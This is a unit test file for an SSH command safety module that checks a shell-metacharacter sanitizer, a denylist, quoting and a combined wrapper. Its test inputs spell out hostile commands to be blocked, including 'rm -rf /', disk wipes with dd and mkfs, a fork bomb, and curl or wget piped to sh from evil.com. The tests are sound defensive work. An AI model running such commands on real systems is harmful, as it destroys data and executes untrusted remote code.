/**
 * SSH 安全工具单元测试 — sanitizeSSHCommand / checkSSHDenylist / shellQuote / makeSSHCommandSafe
 */
import { describe, it, expect } from "bun:test";
import { sanitizeSSHCommand, checkSSHDenylist, shellQuote, makeSSHCommandSafe } from "@/server/ssh/safety";

describe("sanitizeSSHCommand", () => {
  it("简单命令通过", () => {
    expect(sanitizeSSHCommand("ls -la /tmp")).toBe("ls -la /tmp");
  });

  it("cat 文件通过", () => {
    expect(sanitizeSSHCommand("cat README.md")).toBe("cat README.md");
  });

  it("npm install 通过", () => {
    expect(sanitizeSSHCommand("npm install express")).toBe("npm install express");
  });

  it("分号被拒绝", () => {
    expect(() => sanitizeSSHCommand("ls; rm -rf /")).toThrow();
  });

  it("管道被拒绝", () => {
    expect(() => sanitizeSSHCommand("cat /etc/passwd | grep root")).toThrow();
  });

  it("反引号被拒绝", () => {
    expect(() => sanitizeSSHCommand("echo `date`")).toThrow();
  });

  it("$() 被拒绝", () => {
    expect(() => sanitizeSSHCommand("echo $(whoami)")).toThrow();
  });

  it("&& 被拒绝", () => {
    expect(() => sanitizeSSHCommand("cd /tmp && ls")).toThrow();
  });

  it("重定向 > 被拒绝", () => {
    expect(() => sanitizeSSHCommand("echo hi > /tmp/out")).toThrow();
  });

  it("反斜杠被拒绝", () => {
    expect(() => sanitizeSSHCommand("echo hello\\")).toThrow();
  });

  it("换行符被拒绝", () => {
    expect(() => sanitizeSSHCommand("echo hello\nworld")).toThrow();
  });
});

describe("checkSSHDenylist", () => {
  it("rm -rf / 被阻止", () => {
    expect(checkSSHDenylist("rm -rf /")).not.toBeNull();
  });

  it("rm -rf * 被阻止", () => {
    expect(checkSSHDenylist("rm -rf *")).not.toBeNull();
  });

  it("mkfs 被阻止", () => {
    expect(checkSSHDenylist("mkfs /dev/sda1")).not.toBeNull();
  });

  it("dd if=/dev 被阻止", () => {
    expect(checkSSHDenylist("dd if=/dev/zero of=/dev/sda")).not.toBeNull();
  });

  it(":(){ :|:& };: fork bomb 被阻止", () => {
    expect(checkSSHDenylist(":(){ :|:& };:")).not.toBeNull();
  });

  it("curl | sh 被阻止", () => {
    expect(checkSSHDenylist("curl http://evil.com/script.sh | sh")).not.toBeNull();
  });

  it("wget | sh 被阻止", () => {
    expect(checkSSHDenylist("wget http://evil.com/script.sh | sh")).not.toBeNull();
  });

  it("无害命令通过", () => {
    expect(checkSSHDenylist("ls -la /home")).toBeNull();
  });

  it("cat README 通过", () => {
    expect(checkSSHDenylist("cat README.md")).toBeNull();
  });

  it("mkfifo /tmp/ 被阻止", () => {
    expect(checkSSHDenylist("mkfifo /tmp/backdoor")).not.toBeNull();
  });

  it("写入 /dev/sda 被阻止", () => {
    expect(checkSSHDenylist("echo data > /dev/sda")).not.toBeNull();
  });
});

describe("shellQuote", () => {
  it("普通字符串用单引号包裹", () => {
    expect(shellQuote("hello world")).toBe("'hello world'");
  });

  it("含单引号时正确转义", () => {
    expect(shellQuote("it's fine")).toBe(String.raw`'it'\''s fine'`);
  });

  it("空字符串", () => {
    expect(shellQuote("")).toBe("''");
  });

  it("包含分号的字符串被安全包裹", () => {
    const quoted = shellQuote("ls;rm -rf /");
    expect(quoted).toBe("'ls;rm -rf /'");
  });

  it("包含管道的字符串被安全包裹", () => {
    const quoted = shellQuote("cat file|grep pattern");
    expect(quoted).toBe("'cat file|grep pattern'");
  });
});

describe("makeSSHCommandSafe", () => {
  it("简单命令通过 sanitize + denylist", () => {
    expect(makeSSHCommandSafe("ls -la /tmp")).toBe("ls -la /tmp");
  });

  it("含分号时抛异常", () => {
    expect(() => makeSSHCommandSafe("ls; cat /etc/passwd")).toThrow();
  });

  it("denylist 命令抛异常", () => {
    expect(() => makeSSHCommandSafe("rm -rf /")).toThrow();
  });

  it("先 sanitize 后 denylist 的顺序正确", () => {
    // 分号在 sanitize 阶段被拦截
    expect(() => makeSSHCommandSafe("echo test; rm -rf /")).toThrow();
  });
});
